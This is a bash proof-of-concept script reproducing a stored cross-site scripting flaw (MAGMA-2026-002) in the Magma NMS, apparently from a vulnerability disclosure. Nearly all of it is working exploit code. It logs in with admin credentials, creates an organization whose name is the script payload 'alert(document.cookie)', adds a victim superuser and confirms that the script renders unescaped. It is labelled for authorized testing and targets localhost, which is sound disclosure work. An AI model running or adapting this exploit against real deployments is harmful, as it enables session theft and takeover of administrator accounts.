#!/bin/bash
# =============================================================================
# MAGMA-2026-002 - Stored XSS via Organization Name (curl reproduction)
# =============================================================================
# Prerequisite: an account that can create/rename organizations. In the default
# model that is a SUPERUSER; where MAGMA-2026-001 is present, a role=0 host-org
# user can reach the same route through that bypass.
#
# AUTHORIZED TESTING ONLY.
# =============================================================================

NMS_URL="${NMS_URL:-http://localhost:8081}"
HOST_HOST="${HOST_HOST:-host.localhost:8081}"
ADMIN_EMAIL="${ADMIN_EMAIL:-admin@magma.test}"
ADMIN_PASS="${ADMIN_PASS:-password1234}"

PAYLOAD='xss-</script><script>alert(document.cookie)</script>'
VICTIM_EMAIL="${VICTIM_EMAIL:-xssvictim@test.com}"
VICTIM_PASS="${VICTIM_PASS:-password1234}"
VICTIM_HOST="${VICTIM_HOST:-xss.localhost:8081}"

JAR_ADMIN="$(mktemp)"; JAR_VICTIM="$(mktemp)"
trap 'rm -f "$JAR_ADMIN" "$JAR_VICTIM"' EXIT

urlenc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$1"; }

login() { # jar host email pass
    local jar="$1" host="$2" email="$3" pass="$4"
    local page csrf
    page=$(curl -sf -c "$jar" -H "Host: $host" "$NMS_URL/user/login")
    csrf=$(echo "$page" | grep -oP '"csrfToken":"\K[^"]+' | head -1)
    curl -s -c "$jar" -b "$jar" -X POST "$NMS_URL/user/login" \
        -H "Content-Type: application/x-www-form-urlencoded" -H "Host: $host" \
        -H "X-CSRF-Token: $csrf" \
        -d "email=$(urlenc "$email")&password=$(urlenc "$pass")" -o /dev/null
}

csrf_from() { # jar host
    curl -sf -b "$1" -H "Host: $2" "$NMS_URL/nms/" | grep -oP '"csrfToken":"\K[^"]+' | head -1
}

echo "=============================================================="
echo " MAGMA-2026-002 - Stored XSS via Organization Name"
echo " CVSS 3.1: 5.2 MEDIUM | CVSS 4.0: 6.9 MEDIUM"
echo "=============================================================="

echo "[*] Logging in as $ADMIN_EMAIL (host org)..."
login "$JAR_ADMIN" "$HOST_HOST" "$ADMIN_EMAIL" "$ADMIN_PASS"
CSRF=$(csrf_from "$JAR_ADMIN" "$HOST_HOST")
[ -z "$CSRF" ] && { echo "[-] Login failed or no CSRF token"; exit 1; }
echo "[+] Logged in."

echo "[*] Creating organization with the XSS payload as its name..."
BODY=$(python3 -c "import json,sys; print(json.dumps({'name':sys.argv[1],'networkIDs':['*'],'customDomains':[sys.argv[2]]}))" "$PAYLOAD" "$VICTIM_HOST")
curl -s -b "$JAR_ADMIN" -X POST "$NMS_URL/host/organization/async" \
    -H "Content-Type: application/json" -H "Host: $HOST_HOST" -H "X-CSRF-Token: $CSRF" \
    -d "$BODY" | head -c 300
echo ""

echo "[*] Creating a victim SUPERUSER inside the poisoned organization..."
ENC=$(urlenc "$PAYLOAD")
curl -s -b "$JAR_ADMIN" -X POST "$NMS_URL/host/organization/async/$ENC/add_user" \
    -H "Content-Type: application/json" -H "Host: $HOST_HOST" -H "X-CSRF-Token: $CSRF" \
    -d "{\"email\":\"$VICTIM_EMAIL\",\"password\":\"$VICTIM_PASS\",\"role\":3,\"networkIDs\":[\"*\"]}" | head -c 300
echo ""

echo "[*] Victim logs in and requests /nms..."
login "$JAR_VICTIM" "$VICTIM_HOST" "$VICTIM_EMAIL" "$VICTIM_PASS"
PAGE=$(curl -s -b "$JAR_VICTIM" -H "Host: $VICTIM_HOST" "$NMS_URL/nms/")

echo ""
echo "--- rendered tenant (raw bytes) ---"
echo "$PAGE" | grep -o '"tenant":"[^,]*' | head -1
echo ""

if echo "$PAGE" | grep -qF '\u003c/script'; then
    echo "[+] NOT VULNERABLE: the payload is escaped in the rendered page."
    exit 0
fi

if echo "$PAGE" | grep -q '</script><script>alert(document.cookie)</script>'; then
    echo "[+] STORED XSS CONFIRMED: injected script is present in the rendered page."
    echo "    Open in a browser: $VICTIM_HOST/nms/ ($VICTIM_EMAIL / $VICTIM_PASS)"
else
    echo "[-] Payload not found in the response"
    exit 1
fi
